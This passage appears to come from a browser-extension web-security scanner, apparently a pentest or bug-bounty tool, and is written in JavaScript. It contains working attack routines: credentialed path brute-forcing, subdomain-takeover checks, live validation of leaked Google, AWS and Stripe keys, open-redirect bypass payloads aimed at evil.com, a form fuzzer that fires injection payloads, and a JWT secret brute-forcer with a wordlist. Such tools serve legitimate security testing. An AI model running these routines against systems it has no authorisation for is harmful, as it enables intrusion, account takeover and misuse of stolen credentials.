      const parentDir = u.pathname.replace(/\/[^/]*$/, '/');
      const currentAsDir = u.pathname.endsWith('/') ? u.pathname : u.pathname + '/';
      const bases = new Set();
      if (msg.scope === 'current') {
        if (parentDir !== '/') bases.add(parentDir);
        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
        if (!bases.size) bases.add('');
      } else if (msg.scope === 'root') {
        bases.add('');
      } else {
        bases.add('');
        if (parentDir !== '/') bases.add(parentDir);
        if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);
      }

      const results = [];
      // Baseline 404
      let baselineLen = 0;
      let baselineHash = '';
      try {
        const br = await fetch(origin + '/cyboware-404-test-' + Date.now(), { redirect: 'manual', credentials: 'include', signal: AbortSignal.timeout(2000) });
        if (br.status === 200) {
          const bt = await br.text();
          baselineLen = bt.length;
          baselineHash = simpleHash(bt);
        }
      } catch {}

      // Homepage baseline for redirect detection
      let homeLen = 0;
      let homeHash = '';
      try {
        const hr = await fetch(origin + '/', { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(2000) });
        const ht = await hr.text();
        homeLen = ht.length;
        homeHash = simpleHash(ht);
      } catch {}

      const allPaths = [];
      bases.forEach(base => { paths.forEach(p => {
        const joined = base ? (base + p).replace(/\/\//g, '/') : p;
        allPaths.push(joined);
      }); });
      const uniquePaths = [...new Set(allPaths)];

      for (let i = 0; i < uniquePaths.length; i += 8) {
        const batch = uniquePaths.slice(i, i + 8);
        const promises = batch.map(async (path) => {
          try {
            // redirect: 'follow' so we can read final status/body. With 'manual', responses are
            // opaqueredirect (status 0) and 301/302 status checks become dead code.
            const r = await fetch(origin + path, { redirect: 'follow', credentials: 'include', signal: AbortSignal.timeout(2000) });
            const finalUrl = r.url || (origin + path);
            const wasRedirected = r.redirected;
            const finalPath = (() => { try { return new URL(finalUrl).pathname; } catch { return ''; } })();

            const interesting = r.status === 200 || r.status === 401 || r.status === 403;
            if (!interesting) return null;

            let preview = '';
            let bodyLen = 0;
            let bodyHash = '';

            if (r.status === 200) {
              try {
                const body = await r.text();
                preview = body.slice(0, 200);
                bodyLen = body.length;
                bodyHash = simpleHash(body);
              } catch {}
              // Skip SPA catch-all (same as our 404 baseline)
              if (baselineLen > 0 && Math.abs(bodyLen - baselineLen) < 200) return null;
              if (baselineHash && bodyHash === baselineHash) return null;
              // Skip if identical to homepage
              if (homeHash && bodyHash === homeHash) return null;

              // If we were redirected and landed on login/signin/home, surface as redirect-catchall
              if (wasRedirected) {
                const isLoginRedirect = /login|signin|sign-in|auth/i.test(finalPath);
                const isHomeRedirect = finalPath === '/' || finalPath === '';
                if (isLoginRedirect) return { path, status: 302, preview: 'Redirected to login: ' + finalPath, bodyLen: 0, isRedirectCatchall: true, finalUrl };
                if (isHomeRedirect) return null;  // Redirect-to-home is just a soft 404
                // Real redirect to a real page — keep as 200 with note
                preview = '[redirected to ' + finalPath + '] ' + preview;
              }
            }

            return { path, status: r.status, preview, bodyLen, finalUrl: wasRedirected ? finalUrl : undefined };
          } catch {}
          return null;
        });
        (await Promise.all(promises)).forEach(r => { if (r) results.push(r); });
      }
      sr({ ok: true, results, total: uniquePaths.length, category });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ SUBDOMAIN TAKEOVER — Enhanced: better error classification ═══
  CHECK_TAKEOVER: async (msg, _, sr) => {
    const fingerprints = [
      { service: 'GitHub Pages', cnames: ['github.io'], body: "There isn't a GitHub Pages site here" },
      { service: 'Heroku', cnames: ['herokuapp.com','herokussl.com'], body: 'No such app' },
      { service: 'AWS S3', cnames: ['s3.amazonaws.com','s3-website'], body: 'NoSuchBucket' },
      { service: 'Shopify', cnames: ['myshopify.com'], body: 'Sorry, this shop is currently unavailable' },
      { service: 'Tumblr', cnames: ['tumblr.com'], body: "There's nothing here" },
      { service: 'WordPress.com', cnames: ['wordpress.com'], body: "doesn't exist" },
      { service: 'Ghost', cnames: ['ghost.io'], body: 'The thing you were looking for is no longer here' },
      { service: 'Surge.sh', cnames: ['surge.sh'], body: 'project not found' },
      { service: 'Bitbucket', cnames: ['bitbucket.io'], body: 'Repository not found' },
      { service: 'Pantheon', cnames: ['pantheonsite.io'], body: '404 error unknown site' },
      { service: 'Fastly', cnames: ['fastly.net'], body: 'Fastly error: unknown domain' },
      { service: 'Zendesk', cnames: ['zendesk.com'], body: 'Help Center Closed' },
      { service: 'Unbounce', cnames: ['unbouncepages.com'], body: 'The requested URL was not found' },
      { service: 'Fly.io', cnames: ['fly.dev','edgeapp.net'], body: 'not found' },
      { service: 'Vercel', cnames: ['vercel-dns.com','vercel.app'], body: 'The deployment could not be found' },
      { service: 'Netlify', cnames: ['netlify.app','netlify.com'], body: 'Not Found - Request ID' },
      { service: 'Webflow', cnames: ['proxy.webflow.com','proxy-ssl.webflow.com'], body: 'The page you are looking for' },
      { service: 'Squarespace', cnames: ['squarespace.com'], body: 'Domain has expired' },
      { service: 'Tilda', cnames: ['tilda.ws'], body: 'Please renew your subscription' },
      { service: 'ReadMe.io', cnames: ['readme.io'], body: 'Project doesnt exist' },
      { service: 'Statuspage', cnames: ['statuspage.io'], body: "You are being redirected" },
      { service: 'GitBook', cnames: ['gitbook.io','gitbook.com'], body: "doesn't exist" },
      { service: 'Help Scout', cnames: ['helpscoutdocs.com'], body: 'No settings were found for this company' },
      { service: 'Cargo', cnames: ['cargocollective.com'], body: '404 Not Found' },
      { service: 'Azure', cnames: ['azurewebsites.net','cloudapp.azure.com','trafficmanager.net'], body: '' },
      { service: 'Google Cloud', cnames: ['appspot.com'], body: '' },
      { service: 'CloudFront', cnames: ['cloudfront.net'], body: 'Bad request: ERROR: The request could not be satisfied' },
    ];
    try {
      const results = [];
      for (const sub of msg.subdomains.slice(0, 30)) {
        try {
          const dns = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=CNAME`);
          const d = await dns.json();
          const cnames = d.Answer ? d.Answer.filter(a => a.type === 5).map(a => a.data.replace(/\.$/, '')) : [];
          if (!cnames.length) continue;

          for (const cname of cnames) {
            for (const fp of fingerprints) {
              if (fp.cnames.some(c => cname.includes(c))) {
                let vulnerable = false;
                let errorType = '';
                if (fp.body) {
                  try {
                    const r = await fetch(`https://${sub}`, { signal: AbortSignal.timeout(5000) });
                    const body = await r.text();
                    vulnerable = body.includes(fp.body);
                  } catch (e) {
                    // Enhanced: classify connection errors instead of assuming vulnerable
                    const msg = e.message || '';
                    if (msg.includes('ERR_NAME_NOT_RESOLVED') || msg.includes('NXDOMAIN')) {
                      vulnerable = true;
                      errorType = 'DNS_NXDOMAIN';
                    } else if (msg.includes('ERR_CONNECTION_REFUSED')) {
                      errorType = 'CONNECTION_REFUSED';
                      // Moderate signal — could be takeover or just down
                    } else {
                      errorType = 'TIMEOUT';
                      // Weak signal — don't mark as vulnerable
                    }
                  }
                } else {
                  // Services without body fingerprint (Azure, GCP) — check DNS only
                  try {
                    const dnsA = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=A`);
                    const dA = await dnsA.json();
                    if (!dA.Answer || dA.Answer.length === 0) {
                      vulnerable = true;
                      errorType = 'NO_A_RECORD';
                    }
                  } catch {}
                }
                results.push({ subdomain: sub, cname, service: fp.service, vulnerable, errorType, fingerprint: fp.body || '(DNS check)' });
              }
            }
          }
        } catch {}
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Test Google API key
  TEST_GOOGLE_KEY: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?key=${msg.key}&address=test`);
      const d = await r.json();
      sr({ ok: true, status: d.status, error_message: d.error_message || '' });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Test AWS key
  TEST_AWS_KEY: async (msg, _, sr) => {
    try {
      // Try to call STS GetCallerIdentity
      const r = await fetch('https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15', {
        headers: { 'Authorization': `AWS4-HMAC-SHA256 Credential=${msg.key}/20260101/us-east-1/sts/aws4_request` },
        signal: AbortSignal.timeout(5000)
      });
      const text = await r.text();
      const isValid = r.status !== 403 && text.includes('GetCallerIdentityResult');
      sr({ ok: true, valid: isValid, status: r.status, response: text.slice(0, 300) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },


  // ═══ OPEN REDIRECT ACTIVE TESTER ═══
  TEST_REDIRECT: async (msg, _, sr) => {
    const targetUrl = msg.url;
    const paramName = msg.param;
    const targetOrigin = (() => { try { return new URL(targetUrl).origin; } catch { return ''; } })();
    const payloads = [
      { p: 'https://evil.com', label: 'Absolute URL' },
      { p: '//evil.com', label: 'Protocol-relative' },
      { p: '\\\\evil.com', label: 'Double backslash (Windows-style)' },
      { p: '/\\evil.com', label: 'Slash-backslash bypass' },
      { p: '/%2f/evil.com', label: 'URL-encoded slash' },
      { p: 'https:evil.com', label: 'No-slash bypass' },
      { p: 'https://evil.com%00.target.com', label: 'Null byte' },
      { p: 'https://evil.com%0d%0a', label: 'CRLF injection' },
      { p: '/%09/evil.com', label: 'Tab bypass' },
      { p: 'https://target.com@evil.com', label: 'At-sign bypass' },
      { p: 'https://evil.com#target.com', label: 'Fragment bypass' },
      { p: 'https://evil.com?.target.com', label: 'Query bypass' },
      { p: '//evil.com/.target.com', label: 'Path append bypass' },
      { p: '////evil.com', label: 'Quad-slash bypass' },
      { p: 'javascript:alert(1)', label: 'JavaScript URI' },
      { p: 'data:text/html,<script>alert(1)</script>', label: 'Data URI' },
    ];
    const results = [];
    for (const { p: payload, label } of payloads) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(paramName, payload);
        // redirect: 'follow' so we can read final URL. With 'manual', responses are opaqueredirect
        // (status 0) and 3xx checks become dead code.
        const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(5000) });
        const finalUrl = r.url || '';
        const finalOrigin = (() => { try { return new URL(finalUrl).origin; } catch { return ''; } })();
        const wasRedirected = r.redirected;
        const redirectedOffOrigin = wasRedirected && finalOrigin && finalOrigin !== targetOrigin;
        const redirectsToEvil = redirectedOffOrigin && (finalUrl.includes('evil.com') || finalOrigin.includes('evil.com'));

        let bodyCheck = '';
        // js: and data: URIs aren't followed by fetch but might appear in meta-refresh / JS-driven redirects.
        // Also catch reflection-based redirects in the body.
        if (!wasRedirected && r.status === 200) {
          const body = await r.text();
          if (body.includes(payload)) bodyCheck = 'Payload reflected in response body';
          // Look for meta-refresh redirect to evil.com
          if (/<meta[^>]+http-equiv=["']?refresh["']?[^>]+evil\.com/i.test(body)) bodyCheck = 'Meta-refresh redirect to evil.com';
          // Look for JS-driven redirect
          if (/(?:location\.href|location\.replace|location\s*=)\s*=?\s*["'].*evil\.com/i.test(body)) bodyCheck = 'JS-driven redirect to evil.com';
        }

        results.push({
          payload, label,
          status: r.status,
          location: redirectedOffOrigin ? finalUrl : '',
          isRedirect: wasRedirected,
          redirectsToEvil,
          bodyCheck,
          url: testUrl.toString()
        });
      } catch (e) {
        // Some payloads (data:, javascript:) will throw on fetch — record but don't treat as bypass evidence
        results.push({ payload, label, status: 'err', error: e.message });
      }
    }
    sr({ ok: true, results });
  },
  // Test Stripe key
  TEST_STRIPE_KEY: async (msg, _, sr) => {
    try {
      const r = await fetch('https://api.stripe.com/v1/charges?limit=1', {
        headers: { 'Authorization': `Bearer ${msg.key}` },
        signal: AbortSignal.timeout(5000)
      });
      sr({ ok: true, valid: r.status === 200, status: r.status });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ FORM FIELD FUZZER — POST/GET form submission with payloads ═══
  FUZZ_FORM: async (msg, _, sr) => {
    const { action, method, fields, category, selectedFields } = msg;
    // Use the shared payload library — same source of truth as URL-fuzz. Previously this handler
    // accepted `payloads` from the caller and the caller hardcoded only 4 categories' worth client-side,
    // silently falling back to XSS payloads for any other category. That meant clicking
    // "Proto Pollution" in form mode actually fired <script>alert(1)</script> payloads.
    const payloads = [...(FUZZ_PAYLOADS[category] || FUZZ_PAYLOADS.xss)];
    if (msg.customPayloads && msg.customPayloads.length) {
      msg.customPayloads.forEach(cp => payloads.push({ p: cp, check: 'reflected' }));
    }
    const results = [];

    // Baseline: submit form with original values
    let baselineLen = 0, baselineBody = '', baselineTime = 0;
    try {
      const baseData = new URLSearchParams();
      fields.forEach(f => baseData.append(f.name, f.value || 'test'));
      const t0 = Date.now();
      const baseOpts = method.toUpperCase() === 'POST'
        ? { method: 'POST', body: baseData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(10000) }
        : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(10000) };
      const baseUrl = method.toUpperCase() === 'GET' ? action + '?' + baseData.toString() : action;
      const br = await fetch(baseUrl, baseOpts);
      baselineTime = Date.now() - t0;
      baselineBody = await br.text();
      baselineLen = baselineBody.length;
    } catch {}

    // Test only the selected fields (filter on the server side too — UI already does this, but defensive)
    const fieldsToTest = (selectedFields && selectedFields.length)
      ? fields.filter(f => f.name && selectedFields.includes(f.name))
      : fields.filter(f => f.name);

    for (const field of fieldsToTest) {
      for (const { p: payload, check, expect } of payloads) {
        const formData = new URLSearchParams();
        fields.forEach(f => {
          if (!f.name) return;
          formData.append(f.name, f.name === field.name ? payload : (f.value || 'test'));
        });
        const isTimeBased = check === 'sqli_blind_time';
        try {
          const t0 = Date.now();
          const opts = method.toUpperCase() === 'POST'
            ? { method: 'POST', body: formData.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 8000) }
            : { method: 'GET', credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 8000) };
          const testUrl = method.toUpperCase() === 'GET' ? action + '?' + formData.toString() : action;
          const r = await fetch(testUrl, opts);
          const elapsed = Date.now() - t0;
          const body = await r.text();
          const rawReflected = body.includes(payload);
          let context = '';
          if (rawReflected) {
            const idx = body.indexOf(payload);
            context = body.slice(Math.max(0, idx - 80), Math.min(body.length, idx + payload.length + 80));
          }
          const ev = evaluateFuzzResult({
            check, payload, expect, body, baselineBody, baselineLen,
            elapsed, baselineTime, status: r.status, headers: r.headers,
            rawReflected, context,
          });
          let errorBody = '';
          if (r.status >= 500 && body.length < 5000) errorBody = body.slice(0, 500);
          results.push({
            field: field.name, fieldType: field.type, payload,
            severity: ev.severity, analysis: ev.analysis,
            status: r.status, bodyLen: body.length, elapsed,
            context: ev.severity !== 'safe' ? ev.context : '',
            errorBody,
            responsePreview: body.slice(0, 600),
            responseFull: body.length > 1_000_000 ? body.slice(0, 1_000_000) : body,
            responseTruncated: body.length > 1_000_000,
            responseTotalLen: body.length,
            requestBody: formData.toString(), requestUrl: testUrl,
          });
        } catch (e) {
          results.push({ field: field.name, fieldType: field.type, payload, severity: 'info', analysis: 'Request failed: ' + e.message });
        }
      }
    }
    sr({ ok: true, results, baselineLen, baselineTime, method: method.toUpperCase(), action });
  },

  // JWT weak key brute-force
  JWT_BRUTEFORCE: async (msg, _, sr) => {
    const token = (msg.token || '').trim();
    const parts = token.split('.');
    if (parts.length !== 3) { sr({ ok: false, error: 'Invalid JWT — need 3 dot-separated parts' }); return; }
    const [headerB64, payloadB64, sigB64] = parts;
    let alg = '';
    try { alg = JSON.parse(atob(headerB64.replace(/-/g, '+').replace(/_/g, '/'))).alg; } catch {}
    if (!alg || !alg.startsWith('HS')) { sr({ ok: false, error: `JWT alg is "${alg}" — only HS256/HS384/HS512 can be brute-forced offline` }); return; }
    const hashAlg = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' }[alg];
    if (!hashAlg) { sr({ ok: false, error: 'Unsupported HMAC algorithm: ' + alg }); return; }

    // Wordlist — common JWT secrets seen in the wild + domain-derived guesses
    const wordlist = [
      'secret', 'password', 'key', 'jwt', 'jwtsecret', 'jwt-secret', 'jwt_secret',
      '123456', 'changeme', 'admin', 'test', 'letmein', 'welcome', 'monkey', 'master',
      'qwerty', 'abc123', 'iloveyou', 'password1', '123', '1234', '12345', '111111',
      '0', '1', 'a', 'secret123', 'supersecret', 'topsecret', 'private', 'mysecret',
      'JWT_SECRET', 'jsonwebtoken', 'authsecret', 'apikey', 'myapikey', 'mytoken',
      'your-256-bit-secret', 'your-384-bit-secret', 'your-512-bit-secret',
      'shhhhhhared-secret', 'helloworld', 'qwerty123', 'admin123',
      'default', 'changeit', 'insecure', 'dev', 'development', 'staging', 'prod',
    ];
    if (msg.domain) {
      wordlist.push(msg.domain, msg.domain.replace(/\./g, ''), msg.domain.split('.')[0], msg.domain + '_secret', msg.domain + '-secret', msg.domain + 'jwt');
    }
    if (msg.extra) wordlist.push(...msg.extra.split('\n').map(s => s.trim()).filter(Boolean));

    // Decode the signature: base64url → bytes
    const sigBytes = (() => {
      try {
        const padded = sigB64.replace(/-/g, '+').replace(/_/g, '/') + '==='.slice((sigB64.length + 3) % 4);
        const bin = atob(padded);
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        return bytes;
      } catch { return null; }
    })();
    if (!sigBytes) { sr({ ok: false, error: 'Could not decode JWT signature' }); return; }

    const signedInput = new TextEncoder().encode(headerB64 + '.' + payloadB64);
    const enc = new TextEncoder();
    let foundKey = null;
    let attempted = 0;
    for (const candidate of wordlist) {
      attempted++;
      try {
        const key = await crypto.subtle.importKey('raw', enc.encode(candidate), { name: 'HMAC', hash: hashAlg }, false, ['sign']);
        const computed = new Uint8Array(await crypto.subtle.sign('HMAC', key, signedInput));
        if (computed.length === sigBytes.length) {
          let match = true;
          for (let i = 0; i < computed.length; i++) if (computed[i] !== sigBytes[i]) { match = false; break; }
          if (match) { foundKey = candidate; break; }
        }
      } catch {}
    }
    sr({ ok: true, found: !!foundKey, key: foundKey, attempted, totalKeys: wordlist.length, alg });
  }
};

// ═══ HELPER: Simple string hash for body comparison ═══
function simpleHash(str) {
  let hash = 0;
  const sample = str.length > 2000 ? str.slice(0, 1000) + str.slice(-1000) : str;
  for (let i = 0; i < sample.length; i++) {
    const ch = sample.charCodeAt(i);
    hash = ((hash << 5) - hash) + ch;
    hash = hash & hash;
  }
  return String(hash);
}
